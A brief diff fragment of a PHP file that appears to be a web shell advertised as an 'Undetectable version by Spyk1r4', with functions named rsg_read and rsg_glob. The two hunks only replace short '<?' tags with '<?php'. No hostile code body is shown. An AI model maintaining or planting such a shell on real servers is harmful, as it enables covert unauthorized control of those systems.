@@ -3073,7 +3073,7 @@ if ($act == "about") {echo "<center>Undetectable version by <br> Spyk1r4 <br> <i
            
       
       
-      <?
+      <?php
       
       function rsg_read()
 	{	
@@ -3104,7 +3104,7 @@ rsg_read();
 	
 	?>
 	
-	<?
+	<?php
 	
 	function rsg_glob()
 {
